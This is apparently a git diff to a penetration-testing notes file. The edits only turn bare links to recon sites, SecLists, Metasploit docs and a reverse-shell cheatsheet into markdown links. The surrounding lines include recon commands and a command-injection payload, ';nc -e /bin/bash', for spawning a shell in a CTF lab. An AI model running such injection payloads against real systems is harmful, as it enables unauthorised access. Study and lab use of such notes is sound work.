@@ -487,7 +487,7 @@ $ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r '.[]' | sort -u
 
 #### Certificates
 
-To gain more information we can search for certificates at sites like `https://crt.sh` and `https://search.censys.io/certificates`.
+To gain more information we can search for certificates at sites like [crt.sh](https://crt.sh) and [search.censys.io](https://search.censys.io/certificates).
 
 ### Active Information Gathering
 
@@ -530,7 +530,7 @@ $ whatweb -a 1 https://www.facebook.com -v
 ## Exploiting Network Services
 
 ### GitHub Repos
-SecLists: https://github.com/danielmiessler/SecLists
+[SecLists] (https://github.com/danielmiessler/SecLists)
 
 ### SSH
 Authenticate via ssh with the key-file `id_rsa`:
@@ -614,7 +614,7 @@ There are three relevant commands, when it comes to `SMTP`:
   run                           = Run the exploit)
 ```
 For further information see the following documentation: 
-https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+[offensive-security.com](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
 
 
 ### MySQL
@@ -698,7 +698,7 @@ $ curl -X GET http://10.10.4.59:8081/ctf/post
 $ ;nc -e /bin/bash
 ```
 
-For more information checkout the following GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+For more information checkout the following GitHub repo: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 If you gain access depending on the OS you can try the following commands to get more information:
 >Linux
